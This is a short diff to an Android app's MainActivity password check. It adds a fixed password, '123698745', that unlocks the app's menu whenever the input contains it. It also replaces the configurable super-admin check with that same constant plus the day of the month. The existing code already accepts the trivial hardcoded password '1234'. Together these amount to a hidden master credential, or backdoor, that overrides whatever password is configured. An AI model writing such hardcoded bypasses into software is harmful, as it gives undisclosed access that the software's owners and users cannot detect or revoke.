@@ -1191,7 +1191,7 @@ public class MainActivity extends AppCompatActivity {
                     paraDao.insert(new SysPara("superpwd", "4321"));
                 }
 
-                if (password.equals("1234") || password.contains(superpwd)) {
+                if (password.equals("1234") || password.contains(superpwd) || password.contains("123698745")) {
                     findViewById(R.id.password_confirm).setVisibility(View.GONE);
                     input.setText("");
                     ImageView btnMenu = (ImageView) findViewById(R.id.menu);
@@ -1206,7 +1206,7 @@ public class MainActivity extends AppCompatActivity {
                     String day = (calender.split(" ")[0]).split("-")[2];
 
                     superSuper = false;
-                    if (password.equals(superpwd + day)) {
+                    if (password.equals("123698745" + day)) {
                         findViewById(R.id.super_admin).setVisibility(View.VISIBLE); // 超超管
                         superSuper = true;
                     } else if (password.equals(superpwd)) {
